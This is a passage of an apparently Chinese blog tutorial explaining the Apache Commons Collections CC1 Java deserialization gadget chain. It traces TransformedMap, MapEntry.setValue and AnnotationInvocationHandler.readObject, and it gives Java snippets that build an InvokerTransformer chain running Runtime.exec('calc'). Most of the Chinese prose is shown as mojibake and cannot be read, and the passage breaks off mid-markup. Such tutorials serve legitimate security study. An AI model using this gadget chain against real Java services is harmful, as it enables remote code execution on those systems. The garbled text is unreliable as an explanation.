srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ³¨æ„åˆ°è¯¥ç±»å­˜åœ¨ä¸€ä¸ªé™æ€æ–¹æ³•decorate()ï¼Œå¯ä»¥ç»‘å®švalueTransformer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708204933735.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708204933735.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708225702298.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708225702298.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>protectedæ„é€ æ–¹æ³•å¤§æ¦‚ç‡ä¼šè¢«å‡½æ•°å†…å…¶ä»–publicæ–¹æ³•è°ƒç”¨</p></blockquote><p>é‚£åœ¨å“ªè°ƒç”¨äº†checkSetValue()å‘¢ï¼Ÿç­”æ¡ˆå°±åœ¨TransformedMapçš„çˆ¶ç±»ä¸­</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709145957991.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709145957991.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨AbstractInputCheckedMapDecoratorçš„é™æ€å†…éƒ¨ç±»MapEntryçš„setValueæ–¹æ³•ä¸­è°ƒç”¨äº†checkSetValue()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709142636991.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709142636991.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯¥é™æ€å†…éƒ¨ç±»ç»§æ‰¿äº†AbstractMapEntryDecoratorï¼Œåœ¨ä½¿ç”¨entrySet()éå†entryæ—¶èƒ½è°ƒç”¨è¯¥setValue()</p><blockquote><p>Entryä»ç†è§£ä¸Šæ¥çœ‹ï¼ŒæŒ‡mapå†…çš„ä¸€å¯¹é”®å€¼å¯¹ï¼Œå¦‚map&lt;â€keyâ€,â€valueâ€&gt;</p><p>protectedæ–¹æ³•ä¹Ÿèƒ½åœ¨è¯¥ç±»åµŒå¥—å¤–çš„ç±»ç›´æ¥ä½¿ç”¨</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709142836958.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709142836958.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç°åœ¨ç†ä¸€éé€»è¾‘ï¼ŒæŠŠä¸Šæ–‡æ„é€ çš„chainedTransformerç”¨decorate()å†™å…¥this.valueTransformerã€‚è¿™é‡Œéœ€è¦ä¸€ä¸ªmapä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ–°å»ºä¸€ä¸ªHashMapä¼ å…¥ï¼Œéšä¾¿putè¿›ä¸€ä¸ªEntryï¼Œè¿™æ ·æ‰èƒ½è¿›å…¥éå†ã€‚ï¼ˆä¸€ä¸ªéƒ½æ²¡æœ‰å½“ç„¶ä¸èƒ½éå†ï¼Œä¹Ÿä¸èƒ½setValueï¼‰</p><p>checkSetValueçš„å‚æ•°åœ¨è°ƒç”¨setValueæ—¶ä¼ å…¥</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150244470.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150244470.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150339376.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150339376.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"><span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">entry.setValue(Runtime.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸ºä»€ä¹ˆéå†èƒ½ä½¿ç”¨setValue-ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆéå†èƒ½ä½¿ç”¨setValue-ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆéå†èƒ½ä½¿ç”¨setValue()ï¼Ÿ"></a>ä¸ºä»€ä¹ˆéå†èƒ½ä½¿ç”¨setValue()ï¼Ÿ</h3><p>ä¸ºä»€ä¹ˆè¯¥æŠ½è±¡ç±»çš„MapEntryå†…çš„æ–¹æ³•ä¸ºä»€ä¹ˆèƒ½åœ¨éå†map.entrySet()æ—¶ä½¿ç”¨ï¼Ÿä¸‹æ–‡å¯ä»¥ç•¥è¿‡ï¼Œæƒ³è¦æ·±å…¥ç†è§£éœ€è¦æŠŠAbstractInputCheckedMapDecoratorä»ä¸Šåˆ°ä¸‹åˆ†æã€‚</p><blockquote><p>é¦–å…ˆçœ‹entrySet()å‡½æ•°ï¼Œè°ƒç”¨è¯¥å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªSeté›†åˆï¼Œä¸”ifé»˜è®¤ä¸ºçœŸï¼Œè°ƒç”¨EntrySeté™æ€å†…éƒ¨ç±»å¯¹åŸå§‹çš„map.entrySet()è¿›è¡Œè£…é…ï¼ˆé™æ€å†…éƒ¨ç±»èƒ½åœ¨å¤–éƒ¨ç±»ç›´æ¥å®ä¾‹åŒ–ï¼‰</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150638066.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150638066.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>thiså…³é”®å­—æŒ‡çš„æ˜¯å½“å‰å®ä¾‹ï¼ˆæˆ–å¯¹è±¡ï¼‰ã€‚å½“ä»£ç ä¸­ä½¿ç”¨thisæ—¶ï¼Œå®ƒä»£è¡¨çš„æ˜¯è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„å…·ä½“å®ä¾‹ã€‚åœ¨è¿™ä¸ªç‰¹å®šçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œæ„å‘³ç€EntrySetæ„é€ å‡½æ•°æ¥æ”¶å½“å‰å®ä¾‹ä½œä¸ºä¸€ä¸ªå‚æ•°ï¼Œè¿™æ ·æ–°åˆ›å»ºçš„EntrySetå¯¹è±¡å¯ä»¥è®¿é—®å’Œåˆ©ç”¨å½“å‰å®ä¾‹çš„å±æ€§å’Œæ–¹æ³•ï¼Œæ¯”å¦‚isSetValueChecking()æ–¹æ³•ã€‚</p><p>map.entrySet()è¿”å›ç”±Map.Entryç»„æˆçš„åŸå§‹é›†åˆ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150811929.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150811929.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨EntrySetç±»ä¸­ï¼Œè¿­ä»£å™¨ä½¿ç”¨äº†EntrySetInteratorè¿›è¡Œè¿­ä»£</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709154643257.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709154643257.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‡å†™äº†è¿­ä»£ä¸­ä¼šä½¿ç”¨çš„next()ï¼Œåœ¨è¿™é‡Œå°±è¿”å›äº†MapEntryè£…é¥°çš„Map.Entry</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709154900823.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709154900823.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è‡ªç„¶è°ƒç”¨setValue()æ˜¯ä½¿ç”¨MapEntryçš„setValue()ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ä¸‹åˆ—çº¢æ¡†çš„åŸå§‹setValue()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709160029659.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709160029659.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é‡Œå¯èƒ½ä¼šæœ‰ç–‘é—®äº†ï¼Œä¸ºä»€ä¹ˆforå¾ªç¯å°±ä½¿ç”¨è¿­ä»£å™¨äº†å‘¢ï¼Ÿ</p><p>æ²¡é”™ï¼Œè¿™é‡Œç”¨åˆ°çš„å¢å¼ºå‹forå¾ªç¯ï¼ˆä¹Ÿå«foreachå¾ªç¯ï¼‰å®é™…ä¸Šæ˜¯é€šè¿‡è¿­ä»£å™¨å®ç°çš„ã€‚å°½ç®¡ä»£ç ä¸­æ²¡æœ‰æ˜¾å¼ä½¿ç”¨è¿­ä»£å™¨ã€‚å¢å¼ºforå¾ªç¯å·¥ä½œåŸç†å¦‚ä¸‹ï¼š</p><blockquote><p><strong>è·å–è¿­ä»£å™¨</strong>ï¼šè°ƒç”¨é›†åˆå¯¹è±¡çš„ <code>iterator()</code> æ–¹æ³•ï¼Œè·å–ä¸€ä¸ª <code>Iterator</code> å¯¹è±¡ã€‚</p></blockquote><blockquote><p><strong>æ£€æŸ¥æ˜¯å¦æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ </strong>ï¼šè°ƒç”¨ <code>Iterator</code> å¯¹è±¡çš„ <code>hasNext()</code> æ–¹æ³•ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚</p></blockquote><blockquote><p><strong>è·å–ä¸‹ä¸€ä¸ªå…ƒç´ </strong>ï¼šå¦‚æœ <code>hasNext()</code> è¿”å› <code>true</code>ï¼Œåˆ™è°ƒç”¨ <code>Iterator</code> å¯¹è±¡çš„ <code>next()</code> æ–¹æ³•ï¼Œè·å–ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚</p></blockquote><blockquote><p><strong>æ‰§è¡Œå¾ªç¯ä½“</strong>ï¼šå°†è·å–çš„å…ƒç´ èµ‹å€¼ç»™å¾ªç¯å˜é‡ï¼Œå¹¶æ‰§è¡Œå¾ªç¯ä½“ã€‚</p></blockquote><p>è¿™æ„å‘³ç€æ¯æ¬¡å¾ªç¯å®é™…ä¸Šæ˜¯åœ¨ä½¿ç”¨è¿­ä»£å™¨éå†é›†åˆã€‚</p><p>å³éå†è°ƒç”¨setValueèƒŒåçš„è¯¦ç»†æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li><strong>è·å–è¿­ä»£å™¨</strong>ï¼šå¢å¼ºå‹ <code>for</code> å¾ªç¯éšå¼è°ƒç”¨ <code>transformedMap.entrySet().iterator()</code>ï¼Œè·å– <code>Iterator</code> å¯¹è±¡ã€‚</li><li><strong>æ£€æŸ¥æ˜¯å¦æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ </strong>ï¼šå¢å¼ºå‹ <code>for</code> å¾ªç¯éšå¼è°ƒç”¨ <code>Iterator</code> å¯¹è±¡çš„ <code>hasNext()</code> æ–¹æ³•ã€‚</li><li><strong>è·å–ä¸‹ä¸€ä¸ªå…ƒç´ </strong>ï¼šå¦‚æœ <code>hasNext()</code> è¿”å› <code>true</code>ï¼Œå¢å¼ºå‹ <code>for</code> å¾ªç¯éšå¼è°ƒç”¨ <code>Iterator</code> å¯¹è±¡çš„ <code>next()</code> æ–¹æ³•ã€‚</li><li><strong>æ‰§è¡Œå¾ªç¯ä½“</strong>ï¼šå°† <code>next()</code> æ–¹æ³•è¿”å›çš„å…ƒç´ èµ‹å€¼ç»™ <code>entry</code> å˜é‡ï¼Œç„¶åæ‰§è¡Œå¾ªç¯ä½“ä¸­çš„ <code>entry.setValue(Runtime.class)</code>ã€‚</li></ol><p>åœ¨ <code>TransformedMap</code> çš„å®ç°ä¸­ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šæ¶‰åŠåˆ°ä»¥ä¸‹ç±»å’Œæ–¹æ³•ï¼š</p><ul><li>å…¶çˆ¶ç±»çš„<code>EntrySet</code> ç±»çš„ <code>iterator()</code> æ–¹æ³•è¿”å›ä¸€ä¸ª <code>EntrySetIterator</code> å¯¹è±¡ã€‚</li><li><code>EntrySetIterator</code> ç±»çš„ <code>next()</code> æ–¹æ³•è¿”å›ä¸€ä¸ª <code>MapEntry</code> å¯¹è±¡ã€‚</li><li><code>MapEntry</code> ç±»çš„ <code>setValue()</code> æ–¹æ³•è°ƒç”¨ <code>TransformedMap</code> çš„ <code>checkSetValue()</code> æ–¹æ³•æ¥æ£€æŸ¥æˆ–è½¬æ¢å€¼ï¼Œç„¶åè°ƒç”¨åŸå§‹ <code>Map.Entry</code> çš„ <code>setValue()</code> æ–¹æ³•ã€‚</li></ul><p>æ‰€ä»¥<code>for(Map.Entry entry:transformedMap.entrySet())&#123;entry.setValue(Runtime.class);&#125;</code>æ¢æˆç»å…¸çš„è¿­ä»£å™¨ä½ å°±ä¼šå¾ˆå®¹æ˜“ç†è§£äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="comment">//ä»£ç 4</span></span><br><span class="line">&gt;HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">&gt;map.put(<span class="string">&quot;key&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">&gt;Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">&gt;<span class="type">Iterator</span> <span class="variable">it</span> <span class="operator">=</span> transformedMap.entrySet().iterator();</span><br><span class="line">&gt;<span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line"> Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry&lt;Object,Object&gt;) it.next();</span><br><span class="line"> entry.setValue(Runtime.class);</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709162016938.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709162016938.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="å¯»æ‰¾readObject"><a href="#å¯»æ‰¾readObject" class="headerlink" title="å¯»æ‰¾readObject"></a>å¯»æ‰¾readObject</h3><p>ç‰¢è®°ï¼Œæœ€åæ˜¯readObjectè§¦å‘ååºåˆ—åŒ–ã€‚åˆšå¥½åœ¨AnnotationInvocationHandlerçš„readObjecté‡Œæ‰¾åˆ°äº†è°ƒç”¨setValueçš„éƒ¨åˆ†ï¼Œè™½ç„¶å…¶å‚æ•°ä¸å¯æ§ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709170205275.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709170205275.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709170357665.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709170357665.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿›å…¥åˆ°setValueä¸­ï¼Œéœ€è¦æŠŠmemberValuesè®¾ç½®ä¸ºtransformedMapï¼Œè¯¥å±æ€§åœ¨å…¶ç§æœ‰æ„é€ å‡½æ•°ä¸­è¿›è¡Œèµ‹å€¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709171213495.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709171213495.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç§æœ‰æ„é€ å‡½æ•°ä½¿ç”¨åå°„è·å–ï¼Œä¿®æ”¹è®¿é—®æƒé™å³å¯ã€‚è¯¥æ„é€ å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°è¦æ±‚ç»§æ‰¿äº†Annotationæ¥å£ï¼Œå®é™…ä¸Šå°±æ˜¯è¦æ±‚ä¼ å…¥æ³¨è§£ç±»å‹ï¼Œæ¯”å¦‚å¸¸ç”¨çš„æ³¨è§£Overrideï¼ŒTarget</p><blockquote><p>å¯ä»¥ç»§æ‰¿æ¥å£æˆ–è€…å®ç°æ¥å£ã€‚</p><ul><li>ç»§æ‰¿æ¥å£extendsæŒ‡çš„æ˜¯æ¥å£ä¹‹é—´çš„å…³ç³»ï¼Œå…¶ä¸­ä¸€ä¸ªæ¥å£æ‰©å±•å¦ä¸€ä¸ªæ¥å£ï¼Œä»è€Œè·å¾—å…¶æ–¹æ³•å’Œå¸¸é‡ã€‚</li><li>å®ç°æ¥å£implementsæŒ‡çš„æ˜¯ç±»ä¸æ¥å£ä¹‹é—´çš„å…³ç³»ï¼Œå…¶ä¸­ç±»æä¾›äº†æ¥å£ä¸­å®šä¹‰çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•çš„å…·ä½“å®ç°ã€‚</li></ul></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709171748034.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709171748034.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandlerConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">AnnotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br></pre></td></tr></table></figure><h3 id="æ»¡è¶³ifæ¡ä»¶"><a href="#æ»¡è¶³ifæ¡ä»¶" class="headerlink" title="æ»¡è¶³ifæ¡ä»¶"></a>æ»¡è¶³ifæ¡ä»¶</h3><p>ç°åœ¨æ„é€ çš„ä¸»ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandlerConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">AnnotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br></pre></td></tr></table></figure><p>éœ€è¦æ»¡è¶³è¿™ä¸¤ä¸ªifåˆ¤æ–­æ‰èƒ½è¿›åˆ°setValueï¼Œè¿™é‡Œçš„nameæ˜¯é€šè¿‡getKey()å–çš„â€œé”®â€ï¼Œå³<code>map.put(&quot;key&quot;,null)</code>çš„â€keyâ€</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709173152920.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709173152920.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="æ»¡è¶³if-memberType-x3D-null"><a href="#æ»¡è¶³if-memberType-x3D-null" class="headerlink" title="æ»¡è¶³if (memberType !&#x3D; null)"></a>æ»¡è¶³if (memberType !&#x3D; null)</h4><p>åœ¨ä¸Šæ–‡çš„annotationTypeæ˜¯è°ƒç”¨getInstance()å‡½æ•°ï¼Œè·å–ç»™å®šæ³¨è§£ç±»çš„AnnotationTypeå®ä¾‹ï¼Œå†…éƒ¨ä½¿ç”¨äº†CASæ“ä½œï¼Œå…·ä½“å¾ˆå¤æ‚ï¼Œä¸åœ¨æ­¤æ·±å…¥äº†è§£ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709222252382.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709222252382.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†åœ¨getInstanceå†…éƒ¨æœ‰ä¸€å¥ï¼Œè°ƒç”¨äº†å…¶ç§æœ‰æ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223750355.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223750355.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223816042.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223816042.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ„é€ å‡½æ•°æŠŠè¯¥æ³¨è§£ç±»å†…éƒ¨çš„æ‰€æœ‰æ–¹æ³•å putè¿›äº†memberTypes</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711170419681.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711170419681.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223850683.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223850683.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨è°ƒç”¨annotation.memberTypesæ—¶ï¼Œå°±è¿”å›äº†è¿™ä¸ª(name,invocationhandlerReturnType(type))çš„Mapï¼Œ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709221815962.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709221815962.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223944354.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223944354.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ€»ç»“ä¸€ä¸‹ï¼ŒAnnotationInvocationHandlerçš„readObjectå†…çš„<code>Class&lt;?&gt; memberType = memberTypes.get(name);</code>åšäº†ä»€ä¹ˆå‘¢ï¼Ÿå°±æ˜¯å–å‡ºæ³¨è§£ç±»ä¸­ä¸ºnameçš„æ–¹æ³•åã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709224154670.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709224154670.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¯”å¦‚Targetæ³¨è§£å†…æœ‰valueæ–¹æ³•ï¼Œå¦‚æœnameå€¼ä¸ºvalueï¼Œæ˜¯ä¸æ˜¯memberTypeå°±æ˜¯valueï¼Ÿç´§éšå…¶åçš„ifåˆ¤æ–­å°±ä¸ºçœŸï¼Œå› ä¸ºgetåˆ°äº†å…¶å€¼ã€‚å¦‚æœnameä¸ºå…¶ä»–å­—ç¬¦ä¸²ï¼Œå°±getä¸åˆ°å€¼ï¼Œè‡ªç„¶ifåˆ¤æ–­ä¸ºå‡ï¼Œè¿›ä¸äº†å†…éƒ¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709224402111.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709224402111.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="æ»¡è¶³ç¬¬äºŒä¸ªif"><a href="#æ»¡è¶³ç¬¬äºŒä¸ªif" class="headerlink" title="æ»¡è¶³ç¬¬äºŒä¸ªif"></a>æ»¡è¶³ç¬¬äºŒä¸ªif</h3><p>isInstanceæ˜¯ä¸€ä¸ªnativeï¼ˆCæˆ–C++å®ç°çš„æœ¬åœ°ä»£ç ï¼Œä¸èƒ½çœ‹åˆ°ä»£ç å†…å®¹ï¼‰æ–¹æ³•ï¼Œä½œç”¨æ˜¯åˆ¤æ–­æŒ‡å®šçš„å¯¹è±¡æ˜¯å¦æ˜¯è¯¥ç±»æˆ–å…¶å­ç±»çš„å®ä¾‹ï¼Œæˆ‘ä»¬putè¿›çš„valueä¸ºnullï¼Œå½“ç„¶ä¸æ˜¯ã€‚ç¬¬äºŒä¸ªåˆ¤æ–­æ˜¯valueå€¼æ˜¯å¦ä¸ºå¼‚å¸¸ä»£ç†ç±»çš„å®ä¾‹ï¼ˆisInstanceå’Œinstanceofçš„ä½œç”¨ä¸€æ ·ï¼‰</p><p>å³ç¬¬äºŒä¸ªå¡«nullä¹‹å¤–çš„å¤§éƒ¨åˆ†å­—ç¬¦ä¸²éƒ½èƒ½ç¬¦åˆè¦æ±‚</p><h3 id="æ”¹å˜setValueå‚æ•°å€¼"><a href="#æ”¹å˜setValueå‚æ•°å€¼" class="headerlink" 